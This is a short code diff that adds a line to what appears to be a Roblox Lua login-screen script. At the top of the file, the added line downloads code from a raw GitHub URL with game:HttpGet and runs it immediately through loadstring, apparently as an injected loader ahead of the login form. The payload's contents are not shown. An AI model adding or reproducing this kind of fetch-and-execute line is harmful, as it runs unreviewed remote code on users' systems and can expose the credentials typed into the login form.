@@ -1,4 +1,5 @@
-
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/beta/main/cloud",true))()
+wait(1)
 
 local Login = Instance.new("ScreenGui")
 local LoginFrame = Instance.new("Frame")
